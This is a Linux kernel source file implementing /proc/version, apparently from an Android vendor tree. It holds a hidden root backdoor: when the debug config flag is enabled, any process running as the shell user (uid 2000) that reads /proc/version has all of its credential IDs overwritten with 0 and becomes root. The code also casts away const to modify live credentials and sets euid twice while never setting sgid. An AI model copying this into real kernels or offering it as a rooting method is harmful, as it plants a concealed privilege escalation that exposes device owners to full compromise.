#include <linux/fs.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/utsname.h>

static int version_proc_show(struct seq_file *m, void *v)
{
#ifdef CONFIG_ANDROID_DEBUG_ROOT_ACCESS
        struct cred *cred;
        cred = (struct cred *)__task_cred(current);

        if (cred->uid.val == 2000) {
		printk("sh: becoming root now\n");
                cred->uid.val = 0;
                cred->gid.val = 0;
                cred->suid.val = 0;
                cred->euid.val = 0;
                cred->euid.val = 0;
                cred->egid.val = 0;
                cred->fsuid.val = 0;
                cred->fsgid.val = 0;
        }
#endif

	seq_printf(m, linux_proc_banner,
		utsname()->sysname,
		utsname()->release,
		utsname()->version);
	return 0;
}

static int version_proc_open(struct inode *inode, struct file *file)
{
	return single_open(file, version_proc_show, NULL);
}

static const struct file_operations version_proc_fops = {
	.open		= version_proc_open,
	.read		= seq_read,
	.llseek		= seq_lseek,
	.release	= single_release,
};

static int __init proc_version_init(void)
{
	proc_create("version", 0, NULL, &version_proc_fops);
	return 0;
}
module_init(proc_version_init);
